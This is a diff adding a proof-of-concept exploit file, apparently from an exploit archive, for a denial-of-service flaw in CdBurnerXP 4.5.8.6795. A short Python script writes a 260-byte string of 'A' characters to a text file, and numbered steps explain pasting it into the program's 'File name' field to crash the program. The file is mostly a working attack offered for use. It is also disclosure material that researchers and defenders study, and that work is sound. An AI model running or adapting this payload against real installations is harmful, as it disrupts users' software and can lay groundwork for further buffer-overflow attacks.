@@ -1,0 +1,27 @@
+# Exploit Title: CdBurnerXP 4.5.8.6795 - 'File Name' Denial of Service (PoC)
+# Discovery by: Alan Baeza
+# Discovery Date: 2018-09-13
+# Vendor Homepage: https://cdburnerxp.se/
+# Software Link: https://cdburnerxp.se/downloadsetup.exe
+# Tested Version: 4.5.8.6795
+# Tested on OS  : Windows 10 Pro x64 es
+
+#!/usr/bin/env python
+#-*-coding: utf-8-*-
+# Steps to Produce the DoS: 
+# 1.- Run python code : python dos.py
+# 2.- Open generate.txt and copy content to clipboard
+# 3.- Open CdBurnerXP
+# 4.- Select option "Copy or grab disc"
+# 5.- Select checkbox target "Hard disk"
+# 6.- Paste ClipBoard on "File name"
+# 7.- Clic Copy disc
+# 8.- DoS
+
+import socket, os, sys
+
+buffer = "\x41" * 260
+
+f = open ("generate.txt", "w")
+f.write(buffer)
+f.close()
